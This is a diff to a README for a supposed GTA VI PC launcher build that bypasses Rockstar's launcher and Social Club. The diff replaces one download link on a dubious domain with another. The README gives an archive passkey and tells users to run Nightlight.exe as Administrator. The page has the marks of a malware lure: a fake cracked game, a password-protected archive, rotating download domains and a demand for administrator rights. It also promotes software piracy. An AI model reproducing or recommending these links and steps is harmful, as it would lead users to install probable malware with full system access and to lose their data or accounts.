@@ -6,7 +6,7 @@ GTA VI PC launcher build that bypasses Rockstar Games Launcher, Social Club, and
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Cyberleek`
 
@@ -74,7 +74,7 @@ Archive passkey: `Cyberleek`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Run `Nightlight.exe` **as Administrator**.
 4. Select the folder where your game resides.
